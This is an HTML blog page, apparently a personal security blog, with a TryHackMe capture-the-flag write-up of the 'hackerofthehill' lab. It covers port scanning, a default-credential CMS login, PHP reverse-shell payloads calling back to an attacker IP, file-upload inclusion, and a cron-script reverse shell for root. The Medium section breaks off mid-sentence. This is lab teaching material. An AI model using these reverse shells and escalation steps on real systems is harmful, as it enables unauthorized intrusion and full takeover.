@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Tryhackme hackerofthehill | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Tryhackme hackerofthehill | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Tryhackme hackerofthehill" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in here" />
+<meta property="og:description" content="Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in here" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/thm_hackerofthehill/bg.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-11T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/thm_hackerofthehill/bg.png" />
+<meta property="twitter:title" content="Tryhackme hackerofthehill" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Tryhackme hackerofthehill","dateModified":"2021-03-11T00:00:00-06:00","description":"Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in here","datePublished":"2021-03-11T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-hackerofthehill/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-hackerofthehill/","image":"/assets/thm_hackerofthehill/bg.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Tryhackme hackerofthehill</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-03-11">11 Mar 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/thm_hackerofthehill/bg.png" alt="Tryhackme hackerofthehill">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+        <p><em></em></p>
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#easy">Easy</a>
+    <ul>
+      <li><a href="#scanning">Scanning</a></li>
+      <li><a href="#port-8000">Port 8000</a></li>
+      <li><a href="#port-8001">Port 8001</a></li>
+      <li><a href="#port-8002">Port 8002</a></li>
+      <li><a href="#privilage-escalation">Privilage Escalation</a></li>
+    </ul>
+  </li>
+  <li><a href="#medium">Medium</a>
+    <ul>
+      <li><a href="#scanning-1">Scanning</a></li>
+    </ul>
+  </li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled <code>hackerofthehill</code> with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in <a href="https://tryhackme.com/room/hackerofthehill">here</a></p>
+
+<h2 id="easy">Easy</h2>
+
+<h3 id="scanning">Scanning</h3>
+
+<p>Let’s just scanning full port of the box : <code>nmap 10.10.133.88 -sC -sV -p-</code>. 
+Result :</p>
+<pre><code class="language-bash">nmap 10.10.179.236 -p- --min-rate 10000                                                                 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 19:59 WIB
+Warning: 10.10.179.236 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.179.236
+Host is up (0.34s latency).
+Not shown: 65511 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+2120/tcp  filtered kauth
+5301/tcp  filtered hacl-gs
+8000/tcp  open     http-alt
+8001/tcp  open     vcom-tunnel
+8002/tcp  open     teradataordbms
+9999/tcp  open     abyss
+Nmap done: 1 IP address (1 host up) scanned in 29.46 seconds
+</code></pre>
+<p>Full port Enumeration : <code>nmap 10.10.179.236 -p80,8000,8001,8002,9999 -sC -sV</code>
+Result :</p>
+<pre><code class="language-bash">nmap 10.10.179.236 -p80,8000,8001,8002,9999 -sC -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 20:01 WIB
+Nmap scan report for 10.10.179.236
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/vbcms
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VeryBasicCMS - Home
+8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: My Website
+|_Requested resource was /?page=home.php
+8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Learn PHP
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:56 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:54 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:55 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=3/11%Time=604A14C2%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x2020
+SF:21\x2013:01:54\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
+SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:0
+SF:1:55\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
+SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:01:56
+SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
+SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
+SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.57 seconds
+</code></pre>
+<h3 id="port-8000">Port 8000</h3>
+
+<p>I have done checking a port 80 and its just default apache page and nothing there. So i move on to port 8000 and there is the page :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_1_easy.png" alt="img" /></p>
+
+<p>Then i’m trying to using gobuster for brute the directory and file .</p>
+
+<pre><code>gobuster dir -u http://10.10.179.236:8000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.166.45:8000
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/03/11 20:10:18 Starting gobuster in directory enumeration mode
+===============================================================
+/about (Status: 200)
+/contact (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2021/03/11 20:25:47 Finished
+===============================================================
+</code></pre>
+<p>As you can see we found robots.txt, let’s take a look at that.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_2_easy.png" alt="img" /></p>
+
+<p>The file robots.txt tell us that there is some directory of cms, Now let’s see the page <code>/vbcms</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_3_easy.png" alt="img" /></p>
+
+<p>In this login form i’m trying to performs some default user credentials and i found user of admin <code>admin:admin</code> .</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_4_easy.png" alt="img" /></p>
+
+<p>Then there is some basic of cms we can edit to getting any shell, to simply we can use php command shell like this.</p>
+
+<pre><code class="language-php">&lt;?php  
+  exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.2.47.251/9001 0&gt;&amp;1' ");  
+?&gt;
+</code></pre>
+<p><img src="/assets/thm_hackerofthehill/bg_6_easy.png" alt="img" /></p>
+
+<p>Now we have the shell, After that we can get the flag.</p>
+
+<pre><code class="language-bash">serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune                                     
+cat /usr/games/fortune                                                               
+VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo=                                 
+serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune|base64 -d               
+cat /usr/games/fortune|base64 -d                                                     
+THM{NG----------------------------Y1}                                                
+serv1@web-serv:/var/www/serv1/public$ 
+</code></pre>
+
+<h3 id="port-8001">Port 8001</h3>
+
+<p>Let’s go to port 8001 :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_7_easy.png" alt="img" /></p>
+
+<p>Then we go to tab Support :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_8_easy.png" alt="img" /></p>
+
+<p>At this section i am using burpsuite to capture the response.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_9_easy.png" alt="img" /></p>
+
+<p>As you can see we can know where the location of the file upload and i’m tried to put the link upload to the parameter <code>?page=</code> and there is the page.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_10_easy.png" alt="img" /></p>
+
+<p>The page shows us the text of the image we uploaded. So i tried to put basic command php and see what it works .</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_11_easy.png" alt="img" /></p>
+
+<p>Then Let’s take a look at source code</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_12_easy.png" alt="img" /></p>
+
+<p>As you can see that its work. Now let’s put shell on php code like we doing before.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_13_easy.png" alt="img" /></p>
+
+<p>Now we get the shell of serv2 :D, Let’s go to flag in <code>/var/lib/rary</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_14_easy.png" alt="img" /></p>
+
+<h3 id="port-8002">Port 8002</h3>
+
+<p>After port 8001 we gonna to take a look at port 8002 and here the page :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_1_medium.png" alt="img" /></p>
+
+<p>Then we can create accound <code>Sign me Up</code> and after sign up there can’t working, now just take a look at <code>try free lesson</code> and check id <code>echo `id`;</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_2_medium.png" alt="img" /></p>
+
+<p>then we can get any shell from this:</p>
+<pre><code class="language-php">exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.2.47.251/9001 0&gt;&amp;1' ");
+</code></pre>
+<p><img src="/assets/thm_hackerofthehill/bg_3_medium.png" alt="img" /></p>
+
+<p>then <code>nc -lvnp 9001</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_4_medium.png" alt="img" /></p>
+
+<p>So we can get flag in <code>/var/www/serv4/index.php</code></p>
+<pre><code class="language-bash">serv3@web-serv:/var/www/serv3/public$ cat /var/www/serv4/index.php
+                                                
+THM{Ym---------------------------zZh}
+</code></pre>
+<h3 id="privilage-escalation">Privilage Escalation</h3>
+
+<p>First i do checking crontab and there is have some process backup and its running on root. <code>/etc/crontab</code>:</p>
+<pre><code class="language-bash">
+serv3@web-serv:/var/www/serv3/public$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /home/serv3/backups/backup.sh
+</code></pre>
+
+<p>Since file permission is can be execute, then we can change backup.sh to all user <code>chmod 777 /home/serv3/backups/backup.sh</code> and add code execution like this <code>echo 'bash -i &gt;&amp; /dev/tcp/10.2.47.251/9003 0&gt;&amp;1' &gt;&gt; /home/serv3/backups/backu.sh</code>, the last of it is prepare the netcat <code>nc -lvnp 9003</code>. Wait until we can hit in nc.
+<img src="/assets/thm_hackerofthehill/bg_5_medium.png" alt="img" /></p>
+
+<p>Then wait it</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_6_medium.png" alt="img" /></p>
+
+<p>Now we have the root user, so you can grab any flag or all flag if you want :D. the flag of root will be in <code>/root/root.txt</code></p>
+
+<h2 id="medium">Medium</h2>
+
+<h3 id="scanning-1">Scanning</h3>
+
+<p>Let’s just scanning full port of the box : ` nmap 10.10.59.182 -p- –min-rate 10000 `</p>
+<pre><code class="language-bash">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:22 WIB
+Nmap scan report for 10.10.59.182
+Host is up (0.39s latency).
+Not shown: 65529 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 66.55 seconds
+</code></pre>
+<p>Now let’s enumeration all port : <code>nmap 10.10.59.182 -p80,135,139,445,3269 -sC -sV</code></p>
+
+<pre><code class="language-bash">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:25 WIB
+Nmap scan report for 10.10.59.182
+Host is up (0.37s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: PhotoStore - Home
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3269/tcp open  tcpwrapped
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -2s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-03-18T10:25:46
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.26 seconds
+</code></pre>
+
+<p>Let’s take a look at port 80 :</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium1.png" alt="img" /></p>
+
+<p>Now let’s signup and login this website then will be able go to dashboard.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium2.png" alt="img" /></p>
+
+<p>then i’m gonna to test upload file .jpg and this happens.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium3.png" alt="img" /></p>
+
+<p>if we clicked then web show us the image.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium4.png" alt="img" /></p>
+
+<p>and after looking around i found script.js which is we can disable it and try any command injection in username.</p>
+<pre><code class="language-javascript">$('input[name="username"]').keyup(function(){
+    let username = $(this).val();
+    $(this).val( username.replace(/([^a-zA-Z0-9])/g,'') );
+});
+</code></pre>
+<p>i’m trying go to profile , then disable the script.js. I’m trying disable it in mozila firefox which just going to inspect then go to network and disable it.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium5.png" alt="img" /></p>
+
+<p>Now trying to get</p>
+
+
+</div>
+
+<!-- Rating -->
+
+<div class="rating mt-4 mb-4 d-flex align-items-center">
+    <strong class="mr-1">Rating:</strong> <div class="rating-holder">
+<div class="c-rating c-rating--regular" data-rating-value="4.5">
+  <button>1</button>
+  <button>2</button>
+  <button>3</button>
+  <button>4</button>
+  <button>5</button>
+</div>
+</div>
+</div>
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Tryhackme hackerofthehill&url=/writeup-hackerofthehill/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-hackerofthehill/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-hackerofthehill/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Tryhackme">Tryhackme</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#Powershell">Powershell</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#easy-box">easy-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#hard-box">hard-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#medium-box">medium-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#privilage-escalation">privilage escalation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#sql-injection">sql injection</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-exploitation">web exploitation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#windows">windows</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-sustah/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_sustah/bg.png" alt="Tryhackme sustah"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-sustah/">Tryhackme sustah</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">05 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-CVE-SUDOERS/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_lunizzctf/bg.png" alt="Tryhackme LunizzCTF (CVE SUDOERS)"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-CVE-SUDOERS/">Tryhackme LunizzCTF (CVE SUDOERS)</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled LunizzCTF with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">01 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-magician/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_magician/bg.png" alt="Tryhackme Magician"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-magician/">Tryhackme Magician</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
